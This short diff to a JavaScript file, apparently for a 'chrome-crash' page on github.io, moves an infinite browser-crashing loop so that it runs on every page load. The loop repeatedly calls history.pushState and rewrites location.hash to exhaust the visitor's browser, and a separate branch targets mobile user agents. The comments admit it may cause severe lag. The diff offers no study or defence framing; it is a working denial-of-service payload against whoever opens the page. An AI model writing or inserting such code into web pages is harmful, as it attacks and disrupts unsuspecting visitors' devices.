@@ -8,6 +8,11 @@ $location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
 $vwer = '#';
 $x = Math.floor((Math.random() * 10000000000000000000) + 1);
 
+/* This Affects Most Computers Depending On Control */
+while(1) {
+   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();   
+   // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
+} 
     
 if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
     while(1) {
@@ -19,8 +24,4 @@ if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigat
     }
 }
 
-/* This Affects Most Computers Depending On Control */
-while(1) {
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();   
-   // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
-} 
+
